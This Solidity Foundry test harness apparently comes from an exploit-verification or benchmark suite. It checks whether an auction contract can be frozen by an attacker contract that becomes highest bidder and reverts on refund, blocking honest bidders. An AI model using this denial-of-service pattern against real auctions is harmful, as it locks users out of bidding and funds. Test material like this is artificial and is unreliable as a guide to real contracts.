// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "forge-std/Test.sol";
import {AuctionDoS} from "./AuctionDoS.sol";
import {ExploitModule} from "./ExploitModule.sol";

contract AuctionDoSHarness is Test {
    AuctionDoS public auction;
    address public honestBidder = address(0xEEEE);

    event SecurityInvariantBreached(string invariantType, uint256 insolvencyDeficit);

    function setUp() public {
        auction = new AuctionDoS();
    }

    function testExploit() public {
        ExploitModule exploit = new ExploitModule(address(auction));
        vm.deal(address(this), 1 ether);

        // Attacker becomes highest bidder with a contract that reverts on receive
        exploit.runExploit{value: 1 ether}();

        // Honest bidder attempts to place a higher bid (2 ether)
        vm.deal(honestBidder, 2 ether);
        vm.prank(honestBidder);
        bool honestBidSucceeded = false;
        try auction.bid{value: 2 ether}() {
            honestBidSucceeded = true;
        } catch {
            honestBidSucceeded = false; // Auction permanently blocked!
        }

        // Invariant: Auction liveness (subsequent honest bidders must not be permanently blocked)
        if (!honestBidSucceeded) {
            emit SecurityInvariantBreached("DENIAL_OF_SERVICE_LIVENESS", 1);
            console.log("[INVARIANT_BREACHED:DENIAL_OF_SERVICE_LIVENESS]");
            return;
        }

        revert("EXPLOIT_FAILED: Auction liveness maintained");
    }

    receive() external payable {}
}
